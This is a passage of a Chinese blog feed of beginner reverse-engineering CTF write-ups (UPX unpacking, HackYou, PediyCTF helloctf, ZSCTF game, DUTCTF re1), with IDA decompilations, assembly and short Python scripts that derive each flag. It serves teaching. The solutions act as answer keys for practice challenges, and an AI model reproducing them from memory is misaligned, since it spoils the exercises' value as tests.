        <content type="html"><![CDATA[<p>提示里面已经说得很清楚了，<a href="simple2">文件</a>经过了加壳，所以用<code>detect it easy</code>查壳，</p><p><img src="/2019/04/28/simple-unpack/1.png" alt="查壳结果" title="DIE查壳"></p><p>发现是UPX3.91，拿到虚拟机里面脱壳，脱壳后先运行一下看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./simple2</span><br><span class="line">abcdefgh1234567890</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure></p><p>再用IDA看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _isoc99_scanf((<span class="keyword">unsigned</span> __int64)<span class="string">"%96s"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, flag) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulations!"</span>, flag);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>……脱壳后直接就能看到flag了，说白了这道题就是练习脱壳的，也许考察手动脱壳2333，不过不知道Linux下有什么手动脱壳的方法，gdb的话甚至不知道怎么下断点。</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackYou CTF open-source</title>
      <link href="/2019/04/28/HackYou-CTF-open-source/"/>
      <url>/2019/04/28/HackYou-CTF-open-source/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="code.c">这道题</a>给出了源码，不过就算不给我也会自觉F5的🙄。<br>为了凑文章字数，把源码粘到了下面2333。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个既然给了代码就没什么说的，直接看就好了。</p><p>小知识点：</p><ol><li><ul><li>argc – 命令行参数 总个数，包括 可执行程序名。</li><li>argv[i] – 第 i 个参数。</li><li>argv[0] – 可执行程序名。</li></ul></li><li>atoi将字符串转换成整数。</li></ol><p>可以看出，程序要求输入3个参数，并且对应程序中的3个变量。</p><p>第一个参数应当等于<code>0xcafe</code>，第二个参数模5<strong>不等于</strong>3，模17<strong>等于</strong>8，第三个参数等于<code>h4cky0u</code>，接着程序计算了一个hash，是利用了前三个参数计算得到的。最后的key按十六进制输出就是hash。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">first=<span class="number">0xcafe</span></span><br><span class="line">second=<span class="number">25</span></span><br><span class="line">third=<span class="string">'h4cky0u'</span></span><br><span class="line">h=first*<span class="number">31337</span>+(second%<span class="number">17</span>)*<span class="number">11</span>+len(third)<span class="number">-1615810207</span></span><br><span class="line">print(<span class="string">'%x'</span> % h)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PediyCTF2018 helloctf</title>
      <link href="/2019/04/28/PediyCTF2018-helloctf/"/>
      <url>/2019/04/28/PediyCTF2018-helloctf/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="helloctf.exe">这道题</a>提示是flag不是明文比较的，意味着shift+f12不能立刻出flag了23333。<br>目前的几道题我都省略了查壳（因为新手入门题要么没壳，要么直接工具脱。<br>逆向的大概流程应该是先查壳脱壳再静态分析最后动态调试吧。</p></blockquote><p>IDA查看:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+12h] [ebp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">20</span>]; <span class="comment">// [esp+14h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+28h] [ebp-48h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+4Ah] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+4Ch] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;v13, <span class="string">"437261636b4d654a757374466f7246756e"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    print(aPleaseInputYou, v6);</span><br><span class="line">    <span class="built_in">scanf</span>(aS, v9);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v9) &gt; <span class="number">0x11</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v9[v3];</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v8, asc_408044, v4);</span><br><span class="line">      <span class="built_in">strcat</span>(&amp;v10, &amp;v8);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">17</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v10, &amp;v13) )</span><br><span class="line">      print(aSuccess, v7);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print(aWrong, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  print(aWrong, v7);</span><br><span class="line">  result = stru_408090._cnt-- - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( stru_408090._cnt &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> _filbuf(&amp;stru_408090);</span><br><span class="line">  ++stru_408090._ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以推测出，flag长度为17，在while(1)内部的do-while中，程序逐个取出输入字符串的字符，格式化处理后存入v10，最后比较v10和v13，v13在上面已经赋值为437261636b4d654a757374466f7246756e，格式化处理的sprintf中，格式化参数为%x，即转换为十六进制，所以flag是按十六进制存储的，只要把v13转化回来就可以了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x43</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x6b</span>,<span class="number">0x4d</span>,<span class="number">0x65</span>,<span class="number">0x4a</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x46</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x46</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(chr(i),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZSCTF game</title>
      <link href="/2019/04/28/ZSCTF-game/"/>
      <url>/2019/04/28/ZSCTF-game/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="game.exe">这道题</a>是一个命令行小游戏，就是一个一维的开关灯游戏，点亮一盏灯，它前后的两盏灯就会改变状态。这道题第一次做我是玩通关了拿到flag的。。。<br>玩通关的方法就是按顺序输入一圈……</p></blockquote><p>IDA进入main，看汇编感觉太乱了，直接反编译看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_45A7BE(&amp;unk_50B110);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B158);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B1A0);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B1E8);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B230);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B278);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B2C0);</span><br><span class="line">  sub_45A7BE(&amp;unk_50B308);</span><br><span class="line">  sub_45A7BE(<span class="string">"二                                                     |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|              by 0x61                                 |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|                                                      |\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"|------------------------------------------------------|\n"</span>);</span><br><span class="line">  sub_45A7BE(</span><br><span class="line">    <span class="string">"Play a game\n"</span></span><br><span class="line">    <span class="string">"The n is the serial number of the lamp,and m is the state of the lamp\n"</span></span><br><span class="line">    <span class="string">"If m of the Nth lamp is 1,it's on ,if not it's off\n"</span></span><br><span class="line">    <span class="string">"At first all the lights were closed\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"Now you can input n to change its state\n"</span>);</span><br><span class="line">  sub_45A7BE(</span><br><span class="line">    <span class="string">"But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th and (N+1)th w"</span></span><br><span class="line">    <span class="string">"ill be changed too\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"When all lamps are on,flag will appear\n"</span>);</span><br><span class="line">  sub_45A7BE(<span class="string">"Now,input n \n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_45A7BE(<span class="string">"input n,n(1-8)\n"</span>);</span><br><span class="line">      sub_459418();</span><br><span class="line">      sub_45A7BE(<span class="string">"n="</span>);</span><br><span class="line">      sub_4596D4(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">      sub_45A7BE(<span class="string">"\n"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_45A7BE(<span class="string">"sorry,n error,try again\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4576D6(v1 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &gt;= <span class="number">9</span> )</span><br><span class="line">          j____report_rangecheckfailure();</span><br><span class="line">        byte_532E28[i] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j__system(<span class="string">"CLS"</span>);</span><br><span class="line">    sub_458054();</span><br><span class="line">    <span class="keyword">if</span> ( byte_532E28[<span class="number">0</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">1</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">2</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">3</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">4</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">5</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">6</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">7</span>] == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_457AB4();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易看出来sub_457AB4()这个应该是灯全部点亮，符合通关条件之后打印flag的函数。<br>IDA跟进去，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_457AB4</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_45E940();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*上面是一坨数据，省略不复制了*/</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">56</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;v2 + i) ^= *(&amp;v59 + i);</span><br><span class="line">    *(&amp;v2 + i) ^= <span class="number">0x13</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_45A7BE(<span class="string">"%s\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就很清楚地看到flag是通过简单的两步异或计算出来的，异或的密钥和密文都在这个函数里了，于是写脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor=[<span class="number">18</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">65</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">48</span>,<span class="number">65</span>,<span class="number">31</span>,<span class="number">78</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">57</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">44</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">16</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">15</span>,<span class="number">34</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">0</span>]</span><br><span class="line">key=[<span class="number">123</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">119</span>, <span class="number">108</span>, <span class="number">65</span>, <span class="number">41</span>, <span class="number">124</span>, <span class="number">80</span>, <span class="number">125</span>, <span class="number">38</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">74</span>, <span class="number">49</span>, <span class="number">83</span>, <span class="number">108</span>, <span class="number">94</span>, <span class="number">108</span>, <span class="number">84</span>, <span class="number">6</span>, <span class="number">96</span>, <span class="number">83</span>, <span class="number">44</span>, <span class="number">121</span>, <span class="number">104</span>, <span class="number">110</span>, <span class="number">32</span>, <span class="number">95</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">123</span>, <span class="number">127</span>, <span class="number">119</span>, <span class="number">96</span>, <span class="number">48</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">92</span>, <span class="number">29</span>, <span class="number">81</span>, <span class="number">107</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">13</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">117</span>, <span class="number">126</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">    a = key[i]</span><br><span class="line">    a ^= <span class="number">0x13</span></span><br><span class="line">    a ^= xor[i]</span><br><span class="line">    flag += chr(a)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>跑一下就ok了。</p><p>小知识点：</p><p>int sprintf( char <em>buffer, const char </em>format, [ argument] … );</p><p>参数列表</p><ul><li>buffer：char型指针，指向将要写入的字符串的缓冲区。</li><li>format：格式化字符串。</li><li>[argument]…：可选参数，可以是任何类型的数据。</li></ul><p>extern char <em>strcat(char </em>dest, const char *src);</p><ul><li>把src所指向的字符串（包括“\0”）复制到dest所指向的字符串后面（删除*dest原来末尾的“\0”）。要保证*dest足够长，以容纳被复制进来的*src。*src中原有的字符不变。返回指向dest的指针。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DUTCTF re1</title>
      <link href="/2019/04/28/DUTCTF-re1/"/>
      <url>/2019/04/28/DUTCTF-re1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>把以前做过的<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>上的题整理一下。<br><a href="re1.exe">题目文件也一并上传了。</a><br>做逆向没什么经验，所以有些思路上的混乱还请指出（评论功能待施工）。</p></blockquote><p>IDA看一下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401000</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401001</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401003</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">44h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401006</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> ___security_cookie</span><br><span class="line"><span class="symbol">.text:</span>0040100B                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040100D</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401010</span>                 <span class="keyword">movdqu</span>  <span class="built_in">xmm0</span>, <span class="built_in">ds</span>:xmmword_413E34</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401018</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040101A                 <span class="keyword">push</span>    offset aDutctf  <span class="comment">; "欢迎来到DUTCTF呦\n"</span></span><br><span class="line"><span class="symbol">.text:</span>0040101F                 <span class="keyword">movdqu</span>  [<span class="built_in">ebp</span>+var_44], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401024</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_2C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401027</span>                 <span class="keyword">movq</span>    <span class="built_in">xmm0</span>, <span class="built_in">ds</span>:qword_413E44</span><br><span class="line"><span class="symbol">.text:</span>0040102F                 <span class="keyword">movq</span>    [<span class="built_in">ebp</span>+var_34], <span class="built_in">xmm0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401034</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_28], <span 